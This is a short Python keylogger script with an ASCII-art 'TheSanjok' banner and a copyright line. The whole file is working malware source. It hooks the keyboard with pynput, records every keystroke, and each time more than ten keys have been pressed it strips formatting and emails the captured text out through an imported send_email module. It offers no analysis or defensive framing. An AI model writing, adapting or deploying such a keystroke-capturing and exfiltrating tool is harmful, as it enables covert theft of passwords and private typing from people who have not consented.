#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
88888888888888              .d8888b.                   d8b        888      
    888    888             d88P  Y88b                  Y8P        888      
    888    888             Y88b.                                  888      
    888    88888b.  .d88b.  "Y888b.   8888b. 88888b.  8888 .d88b. 888  888 
    888    888 "88bd8P  Y8b    "Y88b.    "88b888 "88b "888d88""88b888 .88P 
    888    888  88888888888      "888.d888888888  888  888888  888888888K  
    888    888  888Y8b.    Y88b  d88P888  888888  888  888Y88..88P888 "88b 
    888    888  888 "Y8888  "Y8888P" "Y888888888  888  888 "Y88P" 888  888 
                                                       888                 
                                                      d88P                 
                                                    888P"                  
"""
#Copyright @TheSanjok
import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
